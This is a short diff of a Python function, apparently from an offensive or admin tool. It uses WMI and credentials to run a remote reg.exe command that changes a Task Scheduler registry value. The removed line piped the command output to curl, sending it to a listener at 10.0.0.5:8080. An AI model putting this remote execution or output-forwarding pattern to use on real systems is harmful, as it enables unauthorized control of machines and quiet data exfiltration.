@@ -9,7 +9,7 @@ def enable_registry_key_wmi(username, password, target_computer):
     c = wmi.WMI(computer=target_computer, user=username, password=password)
 
     # Connect to the StdRegProv class to modify the registry
-    reg = c.Win32_Process.Create(CommandLine='''cmd /c reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration" /v Enabled /t REG_DWORD /d 1 /f | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- https://10.0.0.5:8080''')
+    reg = c.Win32_Process.Create(CommandLine='''cmd /c reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration" /v Enabled /t REG_DWORD /d 1 /f''')
 
     if reg[1] == 0:
         print("[+] Registry key value modified successfully.")
